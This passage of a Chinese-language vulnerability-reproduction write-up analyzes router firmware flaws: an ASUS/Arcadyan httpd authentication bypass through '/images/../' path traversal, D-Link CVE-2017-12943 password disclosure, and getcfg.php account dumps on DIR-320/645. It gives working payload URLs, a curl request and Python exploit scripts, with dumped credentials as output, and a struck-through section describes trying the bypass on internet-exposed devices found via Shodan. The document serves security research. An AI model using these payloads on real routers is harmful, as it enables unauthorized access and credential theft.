<td><code>Fios G3100</code></td>
<td><code>2.0.0.6</code></td>
</tr>
<tr>
<td><code>Vodafone</code></td>
<td><code>EasyBox 904</code></td>
<td><code>4.16</code></td>
</tr>
<tr>
<td><code>Vodafone</code></td>
<td><code>EasyBox 903</code></td>
<td><code>30.05.714</code></td>
</tr>
<tr>
<td><code>Vodafone</code></td>
<td><code>EasyBox 802</code></td>
<td><code>20.02.226</code></td>
</tr>
</tbody>
</table>
</li>
</ul>
</li>
<li>
<p>设备架构：ARM</p>
</li>
<li>
<p>复现进度：</p>
<ul>
<li>已成功复现</li>
<li>已进行静态分析</li>
</ul>
</li>
<li>
<p>受影响的漏洞组件 ：</p>
<ul>
<li>文件名：httpd</li>
<li>功能：用于处理用户发送的 HTTP 请求</li>
</ul>
</li>
<li>
<p>定位漏洞组件的方法和工具：</p>
<ul>
<li>静态分析工具
<ul>
<li>ida(32位)</li>
<li>ghidra</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="anchor" id="解包-1"></div>
<h4 class="relative group">解包 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e5%8c%85-1" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ wget wget https://dlcdnets.asus.com/pub/ASUS/wireless/DSL-AC88U/FW_DSL_AC88U_11005502.zip                  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ unzip FW_DSL_AC88U_11005502.zip  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ binwalk -Me DSL-AC88U_v1.10.05_build502.w  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> _DSL-AC88U_v1.10.05_build502.w.extracted
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ubireader_extract_files 2C0000.ubi 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ls ./ubifs-root/0/rootfs_ubifs 
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">bin  bootfs  data  dev  etc  lib  mnt  opt  proc  ramdisk  rom  sbin  sys  tmp  usr  var  www
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ file httpd   
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">httpd: ELF 32-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ checksec httpd
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">'httpd'</span>
</span></span><span class="line"><span class="cl">    Arch:     arm-32-little
</span></span><span class="line"><span class="cl">    RELRO:    No RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX disabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8000<span class="o">)</span>
</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span></code></pre></div><div class="anchor" id="漏洞分析-1"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>根据Juniper威胁实验室发现的在野漏洞利用细节，发现攻击者在url中通过..%2f来遍历访问/images上层路径中的文件，疑似路径遍历漏洞</p>
<p>使用IDA加载httpd程序，字符串窗口搜索/images</p>
<p>
<figure>
<img alt="image-20240222182817336" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/pwrZ5Gu8NLint1q.png"/>
</figure>
</p>
<p>发现在sub_DEB0函数中使用了该字符串</p>
<p>
<figure>
<img alt="image-20240222183015153" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/oDLuWqZG1BNKYaA.png"/>
</figure>
</p>
<p>分析sub_DEB0函数的功能</p>
<ul>
<li>大致是通过遍历数组，判断数组中是否存在某个元素是传入参数的子串</li>
<li>（此处strncasecmp函数是根据数据元素的长度来进行比较的）</li>
<li>存在则返回1，否则返回0</li>
<li>猜测传入的参数大概率是请求路径，而字符串/images/恰恰是数组的第一个元素，分析数组中元素的字面意思，推断都是在无需登录情况下就可以访问的路径或文件（在未登录的情况下应该也能访问一些图片、htm等文件）</li>
</ul>
<p>继续查看sub_DEB0函数的交叉引用，发现如下逻辑关系</p>
<p>当sub_DEB0函数返回1时，a1+30376地址处的内容被修改为1</p>
<p>
<figure>
<img alt="image-20240222183824132" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/2lbni1JHQLtAcdG.png"/>
</figure>
</p>
<p>a1+30376地址地址处内容与另一个函数sub_1D578的返回值存在‘或’的判断，
如果a1+30376地址处内容为1，
那么函数sub_1D578的返回值无论是什么，结果都为真</p>
<p>查看函数<code>sub_1D578</code>，在该函数中发现了对<code>SID值</code>的校验。并且在对路由器登录抓包过程中发现，当登录成功后，请求其他文件时，会携带一个cookie值，而cookie中就存在SID这个变量。</p>
<p><code>sub_1D578</code>函数中调用的<code>sub_1D0C0</code>函数的部分伪代码</p>
<p>
<figure>
<img alt="image-20240222184200528" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/QmVKeWRny3DOh1g.png"/>
</figure>
</p>
<p><code>sub_1D0C0</code>函数中调用的<code>sub_1CE8C</code>函数的部分伪代码</p>
<p>
<figure>
<img alt="image-20240222184332222" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/KfRYnJvbPkE37jr.png"/>
</figure>
</p>
<p>所以只需要保证<code>sub_DEB0返回值==1</code>即可绕过cookie SID的校验。</p>
<p>而满足sub_DEB0() == 1只需要路径包含指定路径即可，如上图中的/images/、/lang/、/js/、/css/等。</p>
<p>但是，上述指定路径限制了我们访问敏感API或敏感页面。此时，结合路径穿越漏洞，可解除指定路径的限制，实现未登录状态下对任意api/url的合法访问。</p>
<p>再看一下搜索一下字符串，可以看到sub_14C30函数有一个"process_post"字符串</p>
<p>
<figure>
<img alt="image-20240222185114970" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/zUKqn3HmwEhtdcQ.png"/>
</figure>
</p>
<p>发现sub_14C30函数将url放入sub_DF50函数进行处理</p>
<p>
<figure>
<img alt="image-20240222185323106" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/iugXQ31d9PEMS5F.png"/>
</figure>
</p>
<p>而sub_DF50函数又会将url传入sub_167A8函数</p>
<p>sub_167A8函数里存在一个可以与之前漏洞结合起来使用的漏洞点：会跳过特定内容将后续的东西拷贝到前面，从而更换url的内容</p>
<p>
<figure>
<img alt="image-20240222190328679" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/ARj3UZ69BP7Hn8r.png"/>
</figure>
</p>
<p>即这个函数会把/api/../test给转换成/test</p>
<p>结合先前的内容，将url前放入预定义的数据，后面接上/../xxx，就不需要认证即可访问xxx，造成认证绕过漏洞。</p>
<p>例如：/images/../apply_abstract.cgi</p>
<p>程序先匹配到 /images，绕过登录，然后替换 /../ 导致后续访问的是 /apply_abstract.cgi 接口，实现身份验证绕过</p>
<div class="anchor" id="漏洞复现-1"></div>
<h4 class="relative group">漏洞复现 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>由于该设备我们<code>qemu</code>模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接<code>patch</code>，因此，在本地较难复现</p>
<p><del>使用 <code>shodan</code>（ <a href="https://www.shodan.io/search?query=tew-751dr" target="_blank">
    https://www.shodan.io/search?query=tew-751dr</a> ） 查找到还在用表格中路由器设备的站点</del></p>
<p><del>使用<code>zoomeye</code>（https://www.zoomeye.org/discover）来查找也可以</del></p>
<p><del>部分还在用表格中型号路由器设备的站点，可能因为已经升级为了新固件版本，所以poc没有打通</del></p>
<p><del>经过几次尝试，访问<code>http://某ip/images/../apply_abstract.cgi</code>时</del></p>
<p><del>会直接跳转到<code>http://某ip/apply_abstract.cgi</code></del></p>
<p><del>然后弹出身份验证提示</del></p>
<p><del>点击取消之后可以发现已经开始下载apply_abstract.cgi文件了</del></p>
<p>
<figure>
<img alt="image-20240224140231882" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/d3tFOyfz9Hgk6SX.png"/>
</figure>
</p>
<p><del>漏洞复现成功</del></p>
<p>可以复现漏洞，但是这样做不太好（）</p>
<div class="anchor" id="d-link友讯"></div>
<h2 class="relative group">D-Link(友讯) 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#d-link%e5%8f%8b%e8%ae%af" style="text-decoration-line: none !important;">#</a></span>
</h2>
<p>D-link的以往固件可以在下列网站上找到：</p>
<p><a href="https://tsd.dlink.com.tw/ddwn" target="_blank">
    D-Link | Technical Support | Downloads (dlink.com.tw)</a></p>
<p><a href="https://ftp.dlink.ru/pub/Router/" target="_blank">
    Index of /pub/Router (dlink.ru)</a></p>
<div class="anchor" id="cve-2017-12943"></div>
<h3 class="relative group">CVE-2017-12943 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-2017-12943" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-2"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-2" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>漏洞编号：CVE-2017-12943</li>
<li>漏洞类型： 绝对路径遍历攻击</li>
<li>漏洞利用效果：通过绝对路径遍历来读取密码信息</li>
<li>漏洞披露时间：20170818</li>
<li>漏洞描述：
<ul>
<li>带有 v2.x 固件的 D-Link DIR-600 Rev Bx 设备允许远程攻击者通过型号/__show_info.php读取密码？REQUIRE_FILE= 绝对路径遍历攻击</li>
</ul>
</li>
<li>设备型号：D-Link DIR-600 Rev Bx</li>
<li>设备架构：</li>
<li>复现进度：
<ul>
<li>已进行静态分析</li>
</ul>
</li>
<li>受影响的漏洞组件 ：
<ul>
<li>文件名：httpd</li>
<li>功能：用于处理用户发送的 HTTP 请求</li>
</ul>
</li>
<li>定位漏洞组件的方法和工具：
<ul>
<li>静态分析工具
<ul>
<li>ida(32位)</li>
<li>ghidra</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="anchor" id="解包-2"></div>
<h4 class="relative group">解包 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e5%8c%85-2" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p><a href="https://ftp.dlink.ru/pub/Router/" target="_blank">
    Index of /pub/Router (dlink.ru)</a></p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># 安装sasquatch</span>
</span></span><span class="line"><span class="cl">$ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
</span></span><span class="line"><span class="cl">$ git clone https://github.com/devttys0/sasquatch
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> sasquatch <span class="o">&amp;&amp;</span> ./build.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># binwalk：</span>
</span></span><span class="line"><span class="cl">$ sudo apt-get install build-essential autoconf 
</span></span><span class="line"><span class="cl">$ git python-lzma python-crypto libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip
</span></span><span class="line"><span class="cl"><span class="nv">$sudo</span> apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools
</span></span><span class="line"><span class="cl">$ sudo pip install pyqtgraph capstone
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 解决 No module named pkg_resources 的问题</span>
</span></span><span class="line"><span class="cl">$ sudo apt-get install --reinstall python-pkg-resources
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ wget http://files.dlink.com.au/products/DIR-600/REV_B1/Firmware/Firmware_v2.05/DIR600B_FW205b01.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># $ wget https://github.com/d4rk30/CVE-2017-12943/blob/master/FIRMWARE_DIR600B1_B2_v2.01-tomizone-1.1.0.bin</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ sudo binwalk -Me DIR600B_FW205b01.bin
</span></span><span class="line"><span class="cl"><span class="c1"># $ sudo binwalk -Me FIRMWARE_DIR600B1_B2_v2.01-tomizone-1.1.0.bin</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ls ./etc/templates/httpd/
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224015904162" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/65mG8SLU2fbNDHz.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240223182144591" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/GeBl4kEPMiXvxn2.png"/>
</figure>
</p>
<div class="anchor" id="漏洞分析-2"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-2" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># 在_DIR600B_FW205b01.bin.extracted/squashfs-root/www/model 可以看到_show_info.php文件</span>
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /home/iot/vul/D-Link/CVE-2017-12943/_DIR600B_FW205b01.bin.extracted/squashfs-root/www/model
</span></span><span class="line"><span class="cl">$ code _show_info.php
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224020743068" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/lMiCxQjdhvTJzIU.png"/>
</figure>
</p>
<p>可以看到在第 17 行，存在一个路径拼接的问题</p>
<p>其中 require 是引入文件的函数，直接访问当前页面，前面的变量 $LOCATE_PATH 在当前页面没有引入，所以默认是空</p>
<p>所以我们可以构造paylaod来通过绝对路径遍历读取文件</p>
<p>同时我们可以看到在 /etc/templates/httpd 下面有一个 httpasswd.php 输出的是用户名密码</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="nb">cd</span> /home/iot/vul/D-Link/CVE-2017-12943/_DIR600B_FW205b01.bin.extracted/squashfs-root/etc/templates/httpd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ code httpasswd.php
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224021308632" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/ZYkrG1qz25aX9tS.png"/>
</figure>
</p>
<p>所以我们就可以构造payload直接访问这个页面来获得账号密码</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># paylaod:</span>
</span></span><span class="line"><span class="cl">localhost/model/__show_info.php?REQUIRE_FILE<span class="o">=</span>%2Fetc%2Ftemplates%2Fhttpd%2Fhttpasswd.php
</span></span></code></pre></div><div class="anchor" id="漏洞复现-2"></div>
<h4 class="relative group">漏洞复现 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># firmware-analysis-toolkit</span>
</span></span><span class="line"><span class="cl">$ ./fat.py /home/iot/vul/D-Link/CVE-2017-12943/DIR600B_FW205b01.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># firmAE</span>
</span></span><span class="line"><span class="cl">$ sudo ./run.sh -r dir600 /home/iot/vul/D-Link/CVE-2017-12943/FIRMWARE_DIR600B1_B2_v2.01-tomizone-1.1.0.bin
</span></span></code></pre></div><p>fat仿真失败了，不过firmAE成功了，所以接下来进行本地漏洞复现</p>
<p>
<figure>
<img alt="image-20240224014233463" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/lVyRLeOhft6maq3.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240224014441339" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/iBm7jeFGKabJoUQ.png"/>
</figure>
</p>
<p>手动测试漏洞：</p>
<p>直接输入192.168.0.1/model/__show_info.php?REQUIRE_FILE=%2Fetc%2Ftemplates%2Fhttpd%2Fhttpasswd.php</p>
<p>获得账号密码</p>
<p>
<figure>
<img alt="image-20240224014615311" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/UvzCpoW4NHJIdQX.png"/>
</figure>
</p>
<p>成功登入：</p>
<p>
<figure>
<img alt="image-20240224014858370" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/qHxNmhl2G96WnPg.png"/>
</figure>
</p>
<p>也可以使用exp来复现漏洞：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># localhost/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.0.1/model/__show_info.php?REQUIRE_FILE=./etc/templates/httpd/httpasswd.php"</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">)</span>
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224014800363" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/RbzO8WuTmyAq7JS.png"/>
</figure>
</p>
<div class="anchor" id="dir320"></div>
<h3 class="relative group">DIR320 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#dir320" style="text-decoration-line: none !important;">#</a></span>
</h3>
<p><strong>复现过程及漏洞原理与CVE-2017-12943类似</strong></p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ wget https://ftp.dlink.ru/pub/Router/DIR-320/Firmware/old/DIR-320A1_FW121WWb03.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 提取固件</span>
</span></span><span class="line"><span class="cl">binwalk -Me DIR-320A1_FW121WWb03.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 仿真</span>
</span></span><span class="line"><span class="cl">$ sudo ./init.sh
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ubuntu:
</span></span><span class="line"><span class="cl">+ sudo service postgresql restart
</span></span><span class="line"><span class="cl">+ <span class="nb">echo</span> <span class="s1">'Waiting for DB to start...'</span>
</span></span><span class="line"><span class="cl">Waiting <span class="k">for</span> DB to start...
</span></span><span class="line"><span class="cl">+ sleep <span class="m">5</span>
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ sudo ./run.sh -r dir320 /home/iot/vul/D-Link/CVE-2017-12943/DIR-320A1_FW121WWb03.bin
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224020015110" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/KIx4P9HTiZuvAOQ.png"/>
</figure>
</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># payload:</span>
</span></span><span class="line"><span class="cl"><span class="n">localhost</span><span class="o">/</span><span class="n">model</span><span class="o">/</span><span class="n">__show_info</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">REQUIRE_FILE</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpasswd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 直接转到：</span>
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.0.1</span><span class="o">/</span><span class="n">model</span><span class="o">/</span><span class="n">__show_info</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">REQUIRE_FILE</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpasswd</span>
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224020054889" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/Dv1TGejiwKZILWg.png"/>
</figure>
</p>
<div class="anchor" id="dir645"></div>
<h3 class="relative group">DIR645 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#dir645" style="text-decoration-line: none !important;">#</a></span>
</h3>
<p><strong>复现过程及漏洞原理与CVE-2017-12943类似</strong></p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ sudo ./run.sh -r dir645 /home/iot/vul/D-Link/CVE-2017-12943/DIR645A1_FW102B08.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ sudo ./run.sh -r dir645 ./home/iot/vul/D-Link/CVE-2017-12943/DIR645A1_FW102B08.bin
</span></span><span class="line"><span class="cl"> /home/iot/vul/D-Link/CVE-2017-12943/DIR645A1_FW102B08.bin emulation start!!!
</span></span><span class="line"><span class="cl"> extract <span class="k">done</span>!!!
</span></span><span class="line"><span class="cl"> get architecture <span class="k">done</span>!!!
</span></span><span class="line"><span class="cl">mke2fs 1.44.1 <span class="o">(</span>24-Mar-2018<span class="o">)</span>
</span></span><span class="line"><span class="cl">e2fsck 1.44.1 <span class="o">(</span>24-Mar-2018<span class="o">)</span>
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># payload:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># http://192.168.0.1/getcfg.php</span>
</span></span><span class="line"><span class="cl"><span class="c1"># post:SERVICES=DEVICE.ACCOUNT</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">d</span> <span class="s2">"SERVICES=DEVICE.ACCOUNT"</span> <span class="s2">"http://192.168.0.1/getcfg.php"</span>
</span></span></code></pre></div><p>exp：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.0.1/getcfg.php"</span>
</span></span><span class="line"><span class="cl"><span class="c1">#payload = "SERVICES=DEVICE.ACCOUNT"</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"SERVICES"</span><span class="p">:</span> <span class="s2">"DEVICE.ACCOUNT"</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="c1">#data = data.encode("utf-8")</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">➜  /home/iot  python3 exp.py 192.168.0.1
</span></span><span class="line"><span class="cl">&lt;Response <span class="o">[</span>200<span class="o">]</span>&gt;
</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
</span></span><span class="line"><span class="cl">&lt;postxml&gt;
</span></span><span class="line"><span class="cl">&lt;module&gt;
</span></span><span class="line"><span class="cl">    &lt;service&gt;DEVICE.ACCOUNT&lt;/service&gt;
</span></span><span class="line"><span class="cl">    &lt;device&gt;
</span></span><span class="line"><span class="cl">        &lt;gw_name&gt;DIR-645&lt;/gw_name&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        &lt;account&gt;
</span></span><span class="line"><span class="cl">            &lt;seqno&gt;2&lt;/seqno&gt;
</span></span><span class="line"><span class="cl">            &lt;max&gt;2&lt;/max&gt;
</span></span><span class="line"><span class="cl">            &lt;count&gt;2&lt;/count&gt;
</span></span><span class="line"><span class="cl">            &lt;entry&gt;
</span></span><span class="line"><span class="cl">                &lt;uid&gt;USR-&lt;/uid&gt;
</span></span><span class="line"><span class="cl">                &lt;name&gt;admin&lt;/name&gt;
</span></span><span class="line"><span class="cl">                &lt;usrid&gt;&lt;/usrid&gt;
</span></span><span class="line"><span class="cl">                &lt;password&gt;adminhello&lt;/password&gt;
</span></span><span class="line"><span class="cl">                &lt;group&gt;0&lt;/group&gt;
</span></span><span class="line"><span class="cl">                &lt;description&gt;&lt;/description&gt;
</span></span><span class="line"><span class="cl">            &lt;/entry&gt;
</span></span><span class="line"><span class="cl">            &lt;entry&gt;
</span></span><span class="line"><span class="cl">                &lt;uid&gt;USR-1&lt;/uid&gt;
</span></span><span class="line"><span class="cl">                &lt;name&gt;user&lt;/name&gt;
</span></span><span class="line"><span class="cl">                &lt;usrid&gt;&lt;/usrid&gt;
</span></span><span class="line"><span class="cl">                &lt;password&gt;userhello&lt;/password&gt;
</span></span><span class="line"><span class="cl">                &lt;group&gt;101&lt;/group&gt;
</span></span><span class="line"><span class="cl">                &lt;description&gt;&lt;/description&gt;
</span></span><span class="line"><span class="cl">            &lt;/entry&gt;
</span></span><span class="line"><span class="cl">        &lt;/account&gt;
</span></span><span class="line"><span class="cl">        &lt;group&gt;
</span></span><span class="line"><span class="cl">            &lt;seqno&gt;&lt;/seqno&gt;
</span></span><span class="line"><span class="cl">            &lt;max&gt;&lt;/max&gt;
</span></span><span class="line"><span class="cl">            &lt;count&gt;0&lt;/count&gt;
</span></span><span class="line"><span class="cl">        &lt;/group&gt;
</span></span><span class="line"><span class="cl">        &lt;session&gt;
</span></span><span class="line"><span class="cl">            &lt;captcha&gt;0&lt;/captcha&gt;
</span></span><span class="line"><span class="cl">            &lt;dummy&gt;&lt;/dummy&gt;
</span></span><span class="line"><span class="cl">            &lt;timeout&gt;600&lt;/timeout&gt;
</span></span><span class="line"><span class="cl">            &lt;maxsession&gt;128&lt;/maxsession&gt;
